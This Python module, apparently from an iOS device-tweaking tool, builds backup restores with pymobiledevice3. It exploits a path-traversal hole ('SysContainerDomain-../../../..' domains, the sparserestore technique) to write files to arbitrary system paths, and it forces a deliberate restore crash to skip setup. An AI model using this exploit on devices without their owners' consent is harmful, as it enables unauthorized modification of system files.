import asyncio
import os
import plistlib
import shutil
import ssl
import tempfile
import time

from . import backup, perform_restore
from .mbdb import _FileMode
from .protective import clean_backup_for_restore, perform_protective_backup
from pymobiledevice3.lockdown import LockdownClient, create_using_usbmux
from pymobiledevice3.services.installation_proxy import InstallationProxyService
from pymobiledevice3.services.mobilebackup2 import Mobilebackup2Service
from pymobiledevice3.exceptions import ConnectionTerminatedError, PyMobileDevice3Exception

class FileToRestore:
    def __init__(self,
                 contents: str, restore_path: str, contents_path: str = None, domain: str = "",
                 owner: int = 501, group: int = 501, mode: _FileMode = None
                ):
        self.contents = contents
        self.contents_path = contents_path
        self.restore_path = restore_path
        self.domain = domain
        self.owner = owner
        self.group = group
        self.mode = mode

def concat_exploit_file(file: FileToRestore, files_list: list[FileToRestore], last_domain: str) -> str:
    base_path = ""
    # set it to work in the separate volumes (prevents a bootloop)
    if file.restore_path.startswith("/var/mobile/"):
        # required on iOS 17.0+ since /var/mobile is on a separate partition
        base_path = "/var/mobile/backup"
    elif file.restore_path.startswith("/private/var/mobile/"):
        base_path = "/private/var/mobile/backup"
    elif file.restore_path.startswith("/private/var/"):
        base_path = "/private/var/backup"
    # don't append the directory if it has already been added (restore will fail)
    path, name = os.path.split(file.restore_path)
    domain_path = f"SysContainerDomain-../../../../../../../..{base_path}{path}/"
    new_last_domain = last_domain
    if last_domain != domain_path:
        files_list.append(backup.Directory(
            "",
            f"{domain_path}",
            owner=file.owner,
            group=file.group
        ))
        new_last_domain = domain_path
    files_list.append(backup.ConcreteFile(
        "",
        f"{domain_path}{name}",
        owner=file.owner,
        group=file.group,
        contents=file.contents
    ))
    return new_last_domain

def concat_regular_file(file: FileToRestore, files_list: list[FileToRestore], last_domain: str, last_path: str):
    path, name = os.path.split(file.restore_path)
    paths = path.split("/")
    new_last_domain = last_domain
    # append the domain first
    if last_domain != file.domain:
        files_list.append(backup.Directory(
            "",
            file.domain,
            owner=file.owner,
            group=file.group
        ))
        last_path = ""
        new_last_domain = file.domain
    # append each part of the path if it is not already there
    full_path = ""
    mode = file.mode
    if mode == None:
        mode = backup.DEFAULT
    for path_item in paths:
        if full_path != "":
            full_path += "/"
        full_path += path_item
        if not last_path.startswith(full_path):
            files_list.append(backup.Directory(
                full_path,
                file.domain,
                owner=file.owner,
                group=file.group,
                mode=mode
            ))
            last_path = full_path
    # finally, append the file
    files_list.append(backup.ConcreteFile(
        f"{full_path}/{name}",
        file.domain,
        owner=file.owner,
        group=file.group,
        contents=file.contents,
        src_path=file.contents_path,
        mode=mode
    ))
    return new_last_domain, full_path

# merge all files that have duplicates and returns the list without duplicates
def merge_duplicates(original_files: list[FileToRestore]) -> list[FileToRestore]:
    no_dupe_files: list[FileToRestore] = []
    existing_locations: dict[str: int] = {}
    for file in original_files:
        if file.domain == None:
            file_loc = "-"
        else:
            file_loc = file.domain + '-'
        restore_path = file.restore_path
        if file.restore_path.startswith('/'):
            restore_path = restore_path.removeprefix('/')
        file_loc += restore_path
        if file_loc in existing_locations:
            if not restore_path.endswith('.plist'):
                print(f'cannot merge duplicate file, ignoring {file_loc}')
                continue
            # merge the data (plist files only)
            print(f'merging duplicate files for {file_loc}')
            initial_data = plistlib.loads(no_dupe_files[existing_locations[file_loc]].contents)
            added_data = plistlib.loads(file.contents)
            initial_data.update(added_data)
            no_dupe_files[existing_locations[file_loc]].contents = plistlib.dumps(initial_data)
            del initial_data, added_data
        else:
            # add it to the no dupes list
            no_dupe_files.append(file)
            existing_locations[file_loc] = len(no_dupe_files) - 1
    return no_dupe_files

def has_sparserestore_capability(lockdown_client: LockdownClient = None) -> bool:
    if lockdown_client is None:
        return True
    try:
        ver = lockdown_client.product_version.split(".")
        major = int(ver[0])
        minor = int(ver[1]) if len(ver) > 1 else 0
    except (ValueError, IndexError):
        return True
    if major != 18:
        return major < 18
    # there is no iOS 18.0.2 and 18.0.1 works with sparserestore, so no need to check the patch number
    return minor == 0


# --- iOS 27+ three-phase restore -------------------------------------------
#
# Progress is mapped into per-phase ranges so the GUI bar never jumps
# backwards: Phase 1 (protective backup) 0-40, Phase 2 (sparse restore +
# reboot) 40-60, Phase 3 (reconnect + protective restore) 60-100.
_PHASE_BACKUP_END = 40
_PHASE_TWEAK_END = 60

# How long to wait for the device to come back after the iOS 27 security
# recovery before giving up. Apple logo → reboot → progress bar (like
# Erase All Contents) → full boot can take several minutes.
_RECONNECT_TIMEOUT = 20 * 60


def _scaled_callback(progress_callback, lo: float, hi: float):
    """Map pymobiledevice3's raw 0-100 progress into the [lo, hi] range.

    Status strings pass through untouched (the GUI shows them as labels);
    other non-numeric values are dropped so the bar never sees garbage.
    """
    span = hi - lo

    def _cb(value):
        if isinstance(value, str):
            progress_callback(value)
            return
        if isinstance(value, bool) or not isinstance(value, (int, float)):
            return
        pct = max(0.0, min(100.0, float(value)))
        progress_callback(lo + span * pct / 100.0)

    return _cb


async def _wait_for_device(udid: str, progress_callback,
                           timeout: float = _RECONNECT_TIMEOUT) -> LockdownClient:
    """Wait for the device to return after the iOS 27 security recovery.

    Polls usbmux with capped exponential backoff. Fully async — the caller's
    event loop (and the GUI) stays responsive for the whole wait.
    """
    from pymobiledevice3.exceptions import (
        DeviceNotFoundError, PasswordRequiredError, NotPairedError,
        ConnectionFailedError,
    )
    start = time.monotonic()
    deadline = start + timeout
    delay = 5.0
    last_error = None
    while True:
        elapsed = int(time.monotonic() - start)
        progress_callback(
            f"Waiting for device after security recovery "
            f"({elapsed // 60}:{elapsed % 60:02d} elapsed)..."
        )
        try:
            return await create_using_usbmux(serial=udid, autopair=True)
        except (DeviceNotFoundError, PasswordRequiredError, NotPairedError,
                ConnectionFailedError, ConnectionError, OSError,
                asyncio.TimeoutError) as e:
            last_error = e
        if time.monotonic() + delay > deadline:
            break
        await asyncio.sleep(delay)
        delay = min(delay * 1.5, 30.0)
    raise DeviceNotFoundError(
        f"Device {udid} not reachable after reboot "
        f"({int(timeout // 60)} min timeout). Unlock the device and make "
        f"sure it is connected via USB. Last error: {last_error}"
    )


def _is_transient_restore_error(error) -> bool:
    """True for Phase 3 errors that mean 'device still booting, try again'."""
    name = type(error).__name__
    msg = str(error)
    # ssl.SSLError subclasses OSError, so this covers SSL drops too.
    if isinstance(error, (ConnectionTerminatedError, OSError)):
        return True
    if "InvalidService" in name:
        return True
    # MBErrorDomain/1: SpringBoard not ready for a restore yet.
    if "SpringBoard" in msg and "ready for a restore" in msg:
        return True
    return "start" in msg.lower() and "service" in msg.lower()


async def _restore_protective_backup(lc: LockdownClient, backup_root: str,
                                     udid: str, reboot: bool,
                                     progress_callback) -> None:
    """Phase 3: restore the pruned protective backup.

    Retries while SpringBoard / mobilebackup2 are still coming up after the
    security recovery (they can take minutes on iOS 27).
    """
    max_retries = 12
    for attempt in range(1, max_retries + 1):
        try:
            async with Mobilebackup2Service(lc) as mb:
                await mb.restore(
                    backup_root,
                    system=True, copy=True, remove=False,
                    reboot=reboot, source=udid,
                    skip_apps=True,
                    progress_callback=_scaled_callback(
                        progress_callback, _PHASE_TWEAK_END + 10, 100),
                )
            return
        except (PyMobileDevice3Exception, ConnectionTerminatedError,
                ssl.SSLError, OSError) as e:
            if attempt >= max_retries or not _is_transient_restore_error(e):
                raise
            progress_callback(
                f"Device not ready, retrying ({attempt}/{max_retries})..."
            )
            await asyncio.sleep(10)


async def _restore_ios27(back: backup.Backup, reboot: bool,
                         lockdown_client: LockdownClient, progress_callback):
    """iOS 27+ three-phase restore: backup → tweak → reboot → restore.

    Phase 1 (0-40%):  Selective backup of photos, Apple ID, and user
                      settings. Non-protective data is discarded mid-stream,
                      so no multi-GB full backup ever hits the disk.
                      (KeychainDomain is skipped — enabling backup
                      encryption is slow and not needed for tweaks.)
    Phase 2 (40-60%): Apply tweaks via sparse restore → reboot, which
                      triggers the iOS 27 "safe state recovery" wipe.
    Phase 3 (60-100%): Reconnect and restore the pruned Phase 1 backup so
                      user data survives the wipe.
    """
    udid = lockdown_client.udid
    protective_dir = tempfile.mkdtemp(prefix="nugget_protective_")
    backup_root = os.path.join(protective_dir, "device_backup")
    os.makedirs(backup_root, exist_ok=True)
    backup_complete = False
    try:
        # === Phase 1: selective protective backup (0-40%) ===
        progress_callback(0)
        await perform_protective_backup(
            lockdown_client, backup_root,
            progress_callback=_scaled_callback(progress_callback, 0, _PHASE_BACKUP_END),
            include_photos=True,
        )
        backup_complete = True

        # Prune Manifest.db + orphan payloads in a worker thread — a full
        # manifest can have 100k+ rows, too heavy for the event loop.
        removed_rows, removed_files = await asyncio.to_thread(
            clean_backup_for_restore, backup_root, udid
        )
        print(f"[iOS27] Protective backup pruned: "
              f"-{removed_rows} manifest rows, -{removed_files} payload files")
        progress_callback(_PHASE_BACKUP_END)

        # === Phase 2: apply tweaks → reboot (40-60%) ===
        try:
            await perform_restore(
                backup=back, reboot=True,
                lockdown_client=lockdown_client,
                progress_callback=_scaled_callback(
                    progress_callback, _PHASE_BACKUP_END, _PHASE_TWEAK_END),
            )
        except (ConnectionTerminatedError, ssl.SSLEOFError,
                ConnectionAbortedError, ConnectionResetError):
            # Device rebooted before acknowledging — expected.
            pass
        progress_callback(_PHASE_TWEAK_END)

        # === Phase 3: reconnect + restore protective backup (60-100%) ===
        lc = await _wait_for_device(udid, progress_callback)
        try:
            # SpringBoard may still be launching after a fresh boot; the
            # restore retry loop handles readiness, this just avoids an
            # instant first failure.
            progress_callback("Waiting for SpringBoard to finish launching...")
            await asyncio.sleep(10)
            await _restore_protective_backup(
                lc, backup_root, udid, reboot, progress_callback)
        finally:
            try:
                await lc.close()
            except Exception:
                # Connection may already be severed by the final reboot.
                pass
    except Exception as e:
        if backup_complete:
            # Phase 1 succeeded but a later phase failed: keep the backup
            # so the user's photos/settings are recoverable, and say where.
            kept = os.path.join(protective_dir, "device_backup")
            print(f"[iOS27] Restore failed; protective backup kept at: {kept}")
            try:
                e.add_note(f"Protective backup kept at: {kept}")
            except AttributeError:
                pass  # Python < 3.11 — path is still in the log.
            raise
        # Backup never completed — nothing worth keeping, don't leak data.
        shutil.rmtree(protective_dir, ignore_errors=True)
        raise

    shutil.rmtree(protective_dir, ignore_errors=True)
    progress_callback(100)


# files is a list of FileToRestore objects
async def restore_files(files: list[FileToRestore], reboot: bool = False, lockdown_client: LockdownClient = None, progress_callback = lambda x: None):
    # create the files to be backed up
    files_list = [
    ]
    apps_list = []
    active_bundle_ids = []
    apps = None
    sorted_files = sorted(merge_duplicates(files), key=lambda x: (x.domain, x.restore_path), reverse=False)
    # add the file paths
    last_domain = ""
    last_path = ""
    exploit_only = True
    # extra check for system version to prevent sparserestore from restoring on iOS 18.1+
    passed_version_check = has_sparserestore_capability(lockdown_client)
    for file in sorted_files:
        if file.domain == "" or file.domain == "z":
            if passed_version_check:
                last_domain = concat_exploit_file(file, files_list, last_domain)
        else:
            last_domain, last_path = concat_regular_file(file, files_list, last_domain, last_path)
            exploit_only = False
            # add the app bundle to the list
            if last_domain.startswith("AppDomain"):
                bundle_id = last_domain.removeprefix("AppDomain-")
                if not bundle_id in active_bundle_ids:
                    # All AppDomain-* bundles MUST be registered in
                    # Manifest.plist's Applications dictionary, otherwise
                    # the device-side restore daemon will reject the domain
                    # with MBErrorDomain/205 ("Unknown domain name").
                    # This includes system apps like com.apple.PosterBoard.
                    if apps == None:
                        async with InstallationProxyService(lockdown=lockdown_client) as ips:
                            apps = await ips.get_apps(application_type="Any", calculate_sizes=False)
                    try:
                        app_info = apps[bundle_id]
                        active_bundle_ids.append(bundle_id)
                        apps_list.append(backup.AppBundle(
                            identifier=bundle_id,
                            path=app_info["Container"],
                            version=app_info.get("CFBundleVersion", "1.0"),
                            container_content_class="Data/Application"
                        ))
                    except (KeyError, Exception) as e:
                        print(
                            f"WARNING: AppDomain bundle '{bundle_id}'"
                            f" not found in installation proxy"
                            f" ({type(e).__name__}). AppDomain files"
                            f" may cause MBErrorDomain/205."
                        )
                        active_bundle_ids.append(bundle_id)

    # crash the restore to skip the setup (only works for exploit files, NOT on iOS 27+)
    ios_major = 0
    if lockdown_client is not None:
        try:
            ios_major = int(lockdown_client.product_version.split(".")[0])
        except (ValueError, IndexError, AttributeError):
            ios_major = 0
    if exploit_only and (lockdown_client is None or ios_major < 27):
        files_list.append(backup.ConcreteFile("", "SysContainerDomain-../../../../../../../.." + "/crash_on_purpose", contents=b""))

    # create the backup
    back = backup.Backup(files=files_list, apps=apps_list)

    # iOS 27+: use three-phase protective backup + restore
    if ios_major >= 27:
        await _restore_ios27(back, reboot, lockdown_client, progress_callback)
        return

    for fi in files_list:
        print(f"{fi.domain}, {fi.path}")

    try:
        await perform_restore(backup=back, reboot=reboot, lockdown_client=lockdown_client, progress_callback=progress_callback)
    except (ConnectionTerminatedError, ssl.SSLEOFError, ConnectionAbortedError, ConnectionResetError):
        # These errors usually mean the device rebooted successfully before acknowledging the restore.
        # We catch them and treat the process as successful.
        print("Device disconnected during restore - this is expected as the device reboots.")
        
        if progress_callback:
            progress_callback(100)
            
    except Exception as e:
        # If it's a different error, we still want to see it
        raise e


def restore_file(fp: str, restore_path: str, restore_name: str, reboot: bool = False, lockdown_client: LockdownClient = None):
    # open the file and read the contents
    contents = open(fp, "rb").read()

    base_path = "/var/backup"
    if restore_path.startswith("/var/mobile/"):
        # required on iOS 17.0+ since /var/mobile is on a separate partition
        base_path = "/var/mobile/backup"

    # create the backup
    back = backup.Backup(files=[
        # backup.Directory("", "HomeDomain"),
        # backup.Directory("Library", "HomeDomain"),
        # backup.Directory("Library/Preferences", "HomeDomain"),
        # backup.ConcreteFile("Library/Preferences/temp", "HomeDomain", owner=501, group=501, contents=contents, inode=0),
        backup.Directory(
                "",
                f"SysContainerDomain-../../../../../../../..{base_path}{restore_path}",
                owner=501,
                group=501
            ),
        backup.ConcreteFile(
                "",
                f"SysContainerDomain-../../../../../../../..{base_path}{restore_path}{restore_name}",
                owner=501,
                group=501,
                contents=contents#b"",
                # inode=0
            ),
            backup.ConcreteFile("", "SysContainerDomain-../../../../../../../.." + "/crash_on_purpose", contents=b""),
    ])

    try:
        asyncio.run(perform_restore(backup=back, reboot=reboot, lockdown_client=lockdown_client))
    except (ConnectionTerminatedError, ssl.SSLEOFError, ConnectionAbortedError, ConnectionResetError):
        pass